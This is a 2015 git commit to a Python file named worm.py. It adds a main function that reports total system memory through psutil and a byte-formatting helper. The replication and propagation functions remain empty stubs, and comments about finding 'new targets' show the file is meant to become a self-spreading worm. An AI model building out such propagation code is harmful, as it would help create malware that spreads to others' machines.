1b579152476fa2b120ea6a68c8d9a83d04e58d98
alexm52 <alexmcdoom@hotmail.com>
2015-03-17 16:03:28 +0000

    Imported subprocess and psutil. Defined basic test info collecting code in main function (retrieves total sys memory) + function to convert psutil memory format to human readable.

--- worm.py
+++ worm.py
@@ -10,8 +10,19 @@ propagation functions both at build and in use. We should also have a
 reliable method of stopping the program at any time.
 """
 
+import subprocess
+import psutil
+#will need to import some module for networking funcs..
+
 def main():
     """Main function of program."""
+    #repl()
+    #prop()     #maybe can use psutil for these as well..id new targets etc..?
+    
+    # Collect info
+    memory = psutil.virtual_memory()
+    memoryReport = "mem: "+bytes2human(memory.total)
+    print memoryReport
     pass
 
 def repl():
@@ -21,6 +32,24 @@ def repl():
 def prop():
     """Propagation function."""
     pass
+
+def bytes2human(n):
+    ## this code from https://github.com/giampaolo/psutil/blob/master/examples/meminfo.py
+    
+    # http://code.activestate.com/recipes/578019
+    # >>> bytes2human(10000)
+    # '9.8K'
+    # >>> bytes2human(100001221)
+    # '95.4M'
+    symbols = ('K', 'M', 'G', 'T', 'P', 'E', 'Z', 'Y')
+    prefix = {}
+    for i, s in enumerate(symbols):
+        prefix[s] = 1 << (i + 1) * 10
+    for s in reversed(symbols):
+        if n >= prefix[s]:
+            value = float(n) / prefix[s]
+            return '%.1f%s' % (value, s)
+    return "%sB" % n
 
 #if __name__ == '__main__':
 #   main()
